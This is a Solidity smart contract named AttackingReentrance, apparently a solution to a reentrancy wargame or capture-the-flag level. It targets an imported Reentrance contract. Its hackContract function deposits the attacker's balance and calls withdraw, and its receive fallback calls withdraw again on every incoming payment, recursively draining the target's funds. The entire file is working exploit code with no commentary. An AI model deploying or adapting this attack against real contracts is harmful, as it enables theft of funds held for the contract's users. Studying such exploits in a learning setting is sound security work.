// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance rentrance = Reentrance(contractAddress);
        rentrance.donate{value:address(this).balance}(address(this));
        rentrance.withdraw();
    }

    receive() external payable {
        Reentrance(contractAddress).withdraw();
    }
}
